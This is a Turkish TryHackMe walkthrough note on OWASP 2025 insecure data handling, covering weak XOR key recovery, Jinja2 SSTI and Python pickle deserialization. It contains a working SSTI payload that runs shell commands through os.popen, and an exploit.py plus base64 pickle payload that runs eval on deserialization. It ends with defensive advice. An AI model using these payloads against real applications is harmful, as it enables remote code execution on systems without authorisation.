# 📓 THM - OWASP Top 10 2025: Insecure Data Handling (Güvensiz Veri İşleme Zafiyetleri)

**Tags:** #BlueTeam #AppSec #OWASP2025 #InsecureDataHandling #CryptographicFailures #SSTI #Deserialization #Pickle #SOC_L1 #TryHackMe #Walkthrough

## 🏗️ Mimari Yapı

**OWASP Top 10: 2025** standartlarında "Güvensiz Veri İşleme" (Insecure Data Handling) başlığı; uygulamanın kullanıcıdan aldığı verileri, şifreleme anahtarlarını, şablon motorlarını (template engines) ve nesne serileştirme (serialization) mekanizmalarını güvenli bir izolasyon katmanından geçirmeden işlemesinden kaynaklanır.

Kullanıcı girdisinin doğrudan kod, şablon mantığı veya yürütülebilir nesne gibi değerlendirilmesi; veri sızıntısından **Uzaktan Kod Çalıştırmaya (Remote Code Execution - RCE)** kadar varan en kritik güvenlik ihlallerine yol açar.

```
                     [ Güvensiz Veri İşleme Zafiyetleri ]
                                      │
    ┌─────────────────────────────────┼─────────────────────────────────┐
    ▼                                 ▼                                 ▼
 [ A04 ]                           [ A05 ]                           [ A08 ]
Cryptographic Failures            Injection (SSTI)           Data Integrity / Deserialization
- Zayıf XOR ciphers               - Jinja2 şablon motoru     - Python `pickle` nesne çözümü
- Sabit/Zayıf anahtarlar          - Nesne hiyerarşisi istismarı - `__reduce__` ile kod çalıştırma
- Şifreleme/Deşifreleme hataları - RCE / Dosya okuma        - Arbitrary Code Execution
```

Bu döküman, veri işleme mantığındaki kırılmalardan kaynaklanan 3 ana OWASP 2025 kategorisini ele almaktadır:

1. **A04: Cryptographic Failures (Kriptografik Hatalar):** Şifreleme algoritmalarının yanlış/zayıf seçilmesi (Örn: Kısa anahtarlı XOR şifreleme) veya anahtarların yeniden kullanılması sonucu verinin deşifre edilebilir hale gelmesidir.
    
2. **A05: Injection - Server-Side Template Injection (SSTI):** Kullanıcı girdilerinin sunucu tarafında çalışan şablon motorlarına (Jinja2 vb.) doğrudan aktarılarak dinamik olarak işlenmesi sonucu şablon kapsamından (context) çıkıp işletim sisteminde komut çalıştırılmasıdır.
    
3. **A08: Software or Data Integrity Failures - Insecure Deserialization (Güvensiz Serileştirme):** Uygulamanın dışarıdan gelen serileştirilmiş verileri (Python `pickle` vb.) kaynağını ve bütünlüğünü doğrulamadan geri yüklemesi (deserialize etmesi) sonucu sistem üzerinde yetkisiz fonksiyon yürütülmesidir.
    

## 💻 Tüm Komutlar, Kod Parçacıkları ve Parametre Kırılımları

### A. A04: Zayıf XOR Şifreleme Analizi

- **Zafiyetli Mimari:** Base64 ile kodlanmış, 4 karakterli sabit anahtar kalıbına (`KEY_`) sahip zayıf XOR cipher kullanımı.
    
- **Anahtar Çıkarımı (Key Recovery):**
    
    - `KEY_` kalıbı ve XOR mantığının geri döndürülebilir (reversible) olması kullanılarak denemeler sonucunda üretilen geçerli anahtar: `KEY1`
        
    - Tüm mesajlar ve gizli flag aynı anahtar ile deşifre edilir.
        

### B. A05: Jinja2 Server-Side Template Injection (SSTI)

- **Zafiyet Doğrulama (PoC):**
    
    Kod snippet'i
    
    ```
    {{7*7}}
    ```
    
    - **Çıktı:** `49` (Sunucu tarafında aritmetik ifadenin çalıştırıldığını ve SSTI zafiyetinin varlığını doğrular).
        
- **SSTI RCE Payload Yapısı:**
    
    Kod snippet'i
    
    ```
    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
    ```
    
    - **Satır Satır Parametre ve Nesne Hiyerarşisi Analizi:**
        
        - `self`: Mevcut Jinja2 şablon nesnesini ifade eder.
            
        - `.__init__`: Şablon nesnesinin yapıcı (constructor) metoduna erişir.
            
        - `.__globals__`: Python'ın küresel değişken ve modül alanına (global scope) erişim sağlar.
            
        - `.__builtins__`: Python çalışma zamanındaki yerleşik gömülü fonksiyonları (`eval`, `exec`, `__import__` vb.) açığa çıkarır.
            
        - `.__import__('os')`: İşletim sistemi erişimi sağlayan `os` modülünü dinamik olarak içe aktarır.
            
        - `.popen('cat flag.txt')`: İşletim sistemi kabuğunda (shell) `cat flag.txt` komutunu koşturur.
            
        - `.read()`: Komutun standart çıktısını (stdout) okuyarak web sayfasına basar.
            

### C. A08: Insecure Deserialization (Python `pickle`)

- **Zafiyetli Mekanizma:** Python `pickle` modülünün güvensiz kullanımı. `pickle`, nesne serileştirme esnasında `__reduce__` metodunu çağırarak serileştirmeden çıkarma sırasında çalıştırılacak fonksiyon ve parametreleri belirler.
    
- **Zararlı Payload Üretim Scripti (`exploit.py`):**
    
    Python
    
    ```
    import pickle
    import base64
    
    class Malicious:
        def __reduce__(self):
            # Deserialization anında eval() fonksiyonunu çağırır ve flag.txt dosyasını okur
            return (eval, ("open('flag.txt').read()",))
    
    # Nesneyi binary pickle formatına dönüştürür
    payload = pickle.dumps(Malicious())
    
    # Web uygulamasına gönderilmek üzere Base64 formatına kodlar
    encoded = base64.b64encode(payload).decode()
    print(encoded)
    ```
    
- **Üretilen Base64 String (Payload):**
    
    Plaintext
    
    ```
    gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
    ```
    
    - **Çalışma Mantığı:** Bu string web uygulamasına gönderildiğinde, `pickle.loads()` fonksiyonu nesneyi oluştururken `__reduce__` içinde tanımlanan `eval("open('flag.txt').read()")` kodunu sunucu üzerinde çalıştırır.

## 🧠 Uzman Notları ve Kritik Uyarılar

> ⚠️ **MÜLAKAT HAPI - JINJA2 SSTI VE PYTHON OBJECT HIÉRARCHY:**
> 
> Mülakatlarda _"Server-Side Template Injection (SSTI) üzerinden nasıl RCE elde edilir?"_ sorusu geldiğinde verilecek analist yanıtı:
> 
> SSTI zafiyetinde saldırgan şablon motorunun sunduğu alanın (context) dışına çıkar. Python tabanlı Jinja2 şablonlarında `self` veya `''` (boş string) gibi mevcut bir nesneden başlayarak `__class__`, `__mro__`, `__subclasses__` veya `__globals__.__builtins__` özniteliklerine tırmanılır. Buradan `os` veya `subprocess` modülleri içe aktarılarak işletim sistemi seviyesinde komut çalıştırma (RCE) sağlanır.

> 💡 **SEKTÖREL İPUCU - PYTHON `PICKLE` DOKUNDUĞU YERDE TEHLİKELİDİR:**
> 
> Python dökümantasyonunda da açıkça belirtildiği üzere: _"Never unpickle data received from an untrusted or unauthenticated source."_ (`pickle` modülü güvenilmeyen kaynaklardan alınan verileri çözmek için ASLA kullanılmamalıdır). Python'daki `pickle` mekanizması bir veri transfer formatı değil, Python nesne durumlarını saklama aracıdır ve yapısı gereği kod yürütmeye izin verir. Güvenli veri değişimi için daima `json.loads()` veya `marshmallow` gibi şema doğrulayan sistemler seçilmelidir.

> 🚨 **SOC ANALİSTİ UYARISI - "ROLLING YOUR OWN CRYPTO" AMATÖRLÜĞÜ:**
> 
> Kurumsal sistemlerde geliştiricilerin hazır ve test edilmiş kriptografi kütüphaneleri (OpenSSL, PyCryptodome vb.) yerine kendi şifreleme mantıklarını (XOR tabanlı kaydırma, özel yer değiştirme algoritmaları) yazmaları siber güvenlikte kabul edilemez bir tasarım hatasıdır. XOR gibi simetrik ve kısa anahtarlı sistemler bilinen düz metin saldırılarıyla (Known-Plaintext Attack) saniyeler içinde kırılır.
